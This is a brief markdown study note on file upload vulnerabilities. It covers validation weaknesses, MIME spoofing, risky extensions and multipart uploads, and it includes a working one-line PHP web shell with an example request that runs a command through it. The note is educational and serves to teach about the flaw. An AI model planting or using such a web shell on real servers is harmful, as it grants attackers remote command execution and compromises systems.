# File Upload Vulnerabilities

## Definition

Occurs when websites allow dangerous file uploads.

---

# Dangerous Scenario

Uploading server-side scripts.

Example:

```php
<?php echo system($_GET['cmd']); ?>
```

---

# Web Shell

A malicious script used to execute commands remotely.

Example:

```bash
/uploads/shell.php?cmd=id
```

---

# Validation Weaknesses

- MIME type validation only
- Blacklist bypass
- Client-side validation only
- Double extensions

---

# MIME Spoofing

Example:

```http
Content-Type: image/jpeg
```

Even if the file is actually PHP.

---

# Dangerous Extensions

```bash
.php
.phtml
.phar
.php5
```

---

# Multipart Form Data

Used for file uploads.

Example:

```http
Content-Type: multipart/form-data
```

Each part contains:
- Content-Disposition
- Content-Type

---

# Notes

Weak validation may lead to:
- RCE
- Server compromise
- Arbitrary file upload
